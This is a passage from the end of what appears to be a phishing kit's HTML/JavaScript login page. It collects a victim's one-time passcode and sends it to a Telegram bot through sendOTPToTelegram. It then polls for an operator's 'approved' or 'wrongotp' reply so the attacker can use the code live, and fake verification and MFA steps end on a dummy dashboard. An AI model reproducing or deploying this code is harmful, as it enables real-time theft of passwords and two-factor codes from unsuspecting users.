              document.getElementById("password").value = "";
            }
          );
        } else {
          hideWaiting();
          loginBtn.disabled = false;
        }
      });

      // OTP FORM HANDLER
      document.getElementById("otpForm").addEventListener("submit", async function (e) {
        e.preventDefault();

        const otpInputs = document.querySelectorAll(".otp-input");
        const otp = Array.from(otpInputs)
          .map((input) => input.value)
          .join("");
        const otpBtn = document.getElementById("otpBtn");

        if (otp.length !== 6) {
          showAlert("otpAlert", "❌ Please enter all 6 digits.", "error");
          return;
        }

        otpBtn.disabled = true;
        showWaiting("Sending OTP...", "Waiting for verification");

        const requestId = await sendOTPToTelegram(otp);

        if (requestId) {
          showWaiting("Verifying OTP...", "Check your Telegram for approval");

          pollBotResponse(
            requestId,
            () => {
              // OTP Accepted
              hideWaiting();
              otpBtn.disabled = false;
              showVerify();
            },
            () => {
              // Wrong OTP
              hideWaiting();
              otpBtn.disabled = false;
              showAlert(
                "otpAlert",
                "❌ The OTP you have provided is wrong or has expired. Please provide a valid OTP.",
                "error"
              );
              // Clear OTP inputs
              otpInputs.forEach((input) => (input.value = ""));
              otpInputs[0].focus();
            }
          );
        } else {
          hideWaiting();
          otpBtn.disabled = false;
        }
      });

      // VERIFICATION FORM HANDLER
      document.getElementById("verifyForm").addEventListener("submit", function (e) {
        e.preventDefault();
        showMFA();
      });

      // MFA FORM HANDLER
      document.getElementById("mfaForm").addEventListener("submit", function (e) {
        e.preventDefault();
        showDashboard();
      });

      // ==================== HELPER FUNCTIONS ====================

      function startOTPTimer() {
        let timeLeft = 299;
        const timerEl = document.getElementById("otpTimer");

        if (authState.pollingInterval) clearInterval(authState.pollingInterval);

        const interval = setInterval(() => {
          const min = Math.floor(timeLeft / 60);
          const sec = timeLeft % 60;
          timerEl.textContent = `${min}:${String(sec).padStart(2, "0")}`;
          timeLeft--;

          if (timeLeft < 0) {
            clearInterval(interval);
            timerEl.textContent = "Expired";
          }
        }, 1000);
      }

      function resendOTP() {
        showAlert("otpAlert", "ℹ️ OTP has been resent to your email.", "info");
        startOTPTimer();
      }

      function fallbackAuth() {
        const code = prompt("Enter your backup code:");
        if (code && code.length > 0) {
          showDashboard();
        }
      }

      // OTP input handler
      document.querySelectorAll(".otp-input").forEach((input, index, arr) => {
        input.addEventListener("input", function () {
          if (this.value.length > 1) this.value = this.value.slice(0, 1);
          if (this.value && index < arr.length - 1) {
            arr[index + 1].focus();
          }
        });

        input.addEventListener("keydown", function (e) {
          if (e.key === "Backspace" && !this.value && index > 0) {
            arr[index - 1].focus();
          }
        });
      });

      // ==================== TELEGRAM BOT RESPONSE SIMULATOR ====================
      // For DEMO: Open browser console and run:
      // localStorage.setItem('bot_response_login_XXXXX', 'approved'); // or 'rejected'
      // localStorage.setItem('bot_response_otp_XXXXX', 'approved'); // or 'wrongotp'

      console.log(
        "%c🤖 TELEGRAM BOT INTEGRATION ACTIVE",
        "color: #1649ff; font-size: 14px; font-weight: bold"
      );
      console.log(
        "%cTo test bot responses, use localStorage in browser console:",
        "color: #6b7280; font-size: 12px"
      );
      console.log(
        "%clocalStorage.setItem('bot_response_LOGIN_ID', 'approved'); // or 'rejected'",
        "color: #21c87c; font-size: 11px; font-family: monospace"
      );
      console.log(
        "%clocalStorage.setItem('bot_response_OTP_ID', 'approved'); // or 'wrongotp'",
        "color: #21c87c; font-size: 11px; font-family: monospace"
      );
    </script>
  </body>
</html>
